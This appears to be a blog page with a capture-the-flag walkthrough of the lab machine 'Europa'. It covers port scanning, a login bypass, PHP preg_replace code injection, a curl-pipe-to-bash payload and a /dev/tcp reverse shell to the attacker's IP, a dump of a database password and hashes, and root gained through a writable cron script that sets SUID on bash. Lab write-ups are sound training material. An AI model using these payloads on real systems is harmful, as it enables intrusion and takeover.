@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/europa.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/europa.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/europa.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="europa">Europa</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.10.22</p>
+
+<p>Port scan reported the following opened ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack
+80/tcp  open  http    syn-ack
+443/tcp open  https   syn-ack
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+443/tcp open  ssl/http Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>europacorp.htb/organizationName<span class="o">=</span>EuropaCorp Ltd./stateOrProvinceName<span class="o">=</span>Attica/countryName<span class="o">=</span>GR
+| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
+| Not valid before: 2017-04-19T09:06:22
+|_Not valid after:  2027-04-17T09:06:22
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<ul>
+  <li>No UDP</li>
+</ul>
+
+<h3 id="port-80443">Port 80/443</h3>
+
+<h3 id="headers">Headers</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/europa]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> 10.10.10.22                     
+HTTP/1.1 200 OK
+Date: Fri, 01 Dec 2023 17:20:56 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Last-Modified: Wed, 26 Jul 2017 22:36:04 GMT
+ETag: <span class="s2">"30a7-5554012ba5aba"</span>
+Accept-Ranges: bytes
+Content-Length: 12455
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/europa]
+└─<span class="nv">$ </span>curl <span class="nt">-k</span> <span class="nt">-I</span> https://10.10.10.22:443
+HTTP/1.1 200 OK
+Date: Fri, 01 Dec 2023 17:21:29 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Last-Modified: Wed, 26 Jul 2017 22:36:04 GMT
+ETag: <span class="s2">"30a7-5554012ba5aba"</span>
+Accept-Ranges: bytes
+Content-Length: 12455
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div></div>
+
+<p>We have and admin panel at <code class="language-plaintext highlighter-rouge">https://admin-portal.europacorp.htb/login.php</code> but don’t seem to be functional.</p>
+
+<h2 id="admin-portaleuropacorphtb">admin-portal.europacorp.htb</h2>
+
+<p>Testing common injections we bypass the loggin panel.</p>
+
+<p>There is an utility to create openvpn files. If we how the petition is send to the server we notice that regular expressions are being used</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pattern</span><span class="o">=</span>%2Fip_address%2F&amp;ipaddress<span class="o">=</span>10.10.14.5
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+
+<h3 id="testing-a-code-injection">Testing a code injection</h3>
+
+<p>If we search for common regular expressions RCE in php we will find this blog <a href="https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4">https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4</a> where we can see how to trigger a RCE when preg_replace is used.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pattern</span><span class="o">=</span>%2Fa%2Fe&amp;ipaddress<span class="o">=</span>phpinfo<span class="o">()</span>&lt;SNIP&gt;
+</code></pre></div></div>
+
+<p>Sending this request we will see the <code class="language-plaintext highlighter-rouge">phpinfo()</code> page, so we are executing php code.</p>
+
+<h3 id="gaining-remote-access">Gaining remote access</h3>
+
+<p>Sending the next request will give us a shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pattern</span><span class="o">=</span>%2Fa%2Fe&amp;ipaddress<span class="o">=</span>system<span class="o">(</span><span class="s1">'curl+10.10.14.5/rev.sh|bash'</span><span class="o">)</span>&lt;SNIP&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/europa]
+└─<span class="nv">$ </span><span class="nb">cat </span>rev.sh              
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/europa]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443                    
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.22] 55616
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1441<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@europa:/var/www/admin<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h3 id="users-in-the-machine">Users in the machine</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:John Makris,,,:/home/john:/bin/bash
+</code></pre></div></div>
+
+<h3 id="db-inspection">DB inspection</h3>
+
+<p>We can see a password in the db.php file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/admin<span class="nv">$ </span><span class="nb">cat </span>db.php 
+&lt;?php
+<span class="nv">$connection</span> <span class="o">=</span> mysqli_connect<span class="o">(</span><span class="s1">'localhost'</span>, <span class="s1">'john'</span>, <span class="s1">'iEOERHRiDnwkdnw'</span><span class="o">)</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$connection</span><span class="o">){</span>
+die<span class="o">(</span><span class="s2">"Database Connection Failed"</span> <span class="nb">.</span> mysqli_error<span class="o">(</span><span class="nv">$connection</span><span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="nv">$select_db</span> <span class="o">=</span> mysqli_select_db<span class="o">(</span><span class="nv">$connection</span>, <span class="s1">'admin'</span><span class="o">)</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$select_db</span><span class="o">){</span>
+die<span class="o">(</span><span class="s2">"Database Selection Failed"</span> <span class="nb">.</span> mysqli_error<span class="o">(</span><span class="nv">$connection</span><span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Inital access to database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/admin<span class="nv">$ </span>mysql <span class="nt">-ujohn</span> <span class="nt">-piEOERHRiDnwkdnw</span>
+mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 61891
+Server version: 5.7.18-0ubuntu0.16.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+mysql&gt; show tables
+    -&gt; <span class="p">;</span>
+ERROR 1046 <span class="o">(</span>3D000<span class="o">)</span>: No database selected
+mysql&gt; show databases<span class="p">;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| admin              |
++--------------------+
+</code></pre></div></div>
+
+<p>We have some md5 passwords from the database but we cannot crack them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; show tables<span class="p">;</span>
++-----------------+
+| Tables_in_admin |
++-----------------+
+| <span class="nb">users</span>           |
++-----------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
++----+---------------+----------------------+----------------------------------+--------+
+| <span class="nb">id</span> | username      | email                | password                         | active |
++----+---------------+----------------------+----------------------------------+--------+
+|  1 | administrator | admin@europacorp.htb | 2b6d315337f18617ba18922c0b9597ff |      1 |
+|  2 | john          | john@europacorp.htb  | 2b6d315337f18617ba18922c0b9597ff |      1 |
++----+---------------+----------------------+----------------------------------+--------+
+</code></pre></div></div>
+
+<h3 id="strange-cron-files-varwww">Strange cron files /var/www/</h3>
+
+<p>In /var/www we can see some kind of cronjob</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cronjobs<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>           
+total 12
+drwxr-xr-x 2 root root 4096 Jun 23  2017 <span class="nb">.</span>
+drwxr-xr-x 6 root root 4096 May 17  2022 ..
+<span class="nt">-r-xr-xr-x</span> 1 root root  1find 32 May 12  2017 clearlogs
+www-data@europa:/var/www/cronjobs<span class="nv">$ </span><span class="nb">cat </span>clearlogs 
+<span class="c">#!/usr/bin/php</span>
+&lt;?php
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">'/var/www/admin/logs/access.log'</span><span class="p">;</span>
+file_put_contents<span class="o">(</span><span class="nv">$file</span>, <span class="s1">''</span><span class="o">)</span><span class="p">;</span>
+<span class="nb">exec</span><span class="o">(</span><span class="s1">'/var/www/cmd/logcleared.sh'</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cmd<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 8
+drwxrwxr-x 2 root www-data 4096 May 17  2022 <span class="nb">.</span>
+drwxr-xr-x 6 root root     4096 May 17  2022 ..
+</code></pre></div></div>
+
+<p>Lets write the a file called <code class="language-plaintext highlighter-rouge">logcleared.sh</code> and see of something is executed</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cmd<span class="nv">$ </span><span class="nb">cat </span>logcleared.sh 
+<span class="c">#!/bin/sh</span>
+
+<span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> /tmp/pwn
+</code></pre></div></div>
+
+<p>If we check <strong>tmp</strong> file we can see that root has executed the script. Let’s escalate privileges finally.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cmd<span class="nv">$ </span><span class="nb">cat </span>logcleared.sh 
+<span class="c">#!/bin/sh</span>
+
+<span class="nb">chmod </span>u+s /bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cmd<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash 
+<span class="nt">-rwsr-xr-x</span> 1 root root 1037528 May 16  2017 /bin/bash
+</code></pre></div></div>
+
+<p>Bash is SUID and we can executed as root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@europa:/var/www/cmd<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-4.3# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
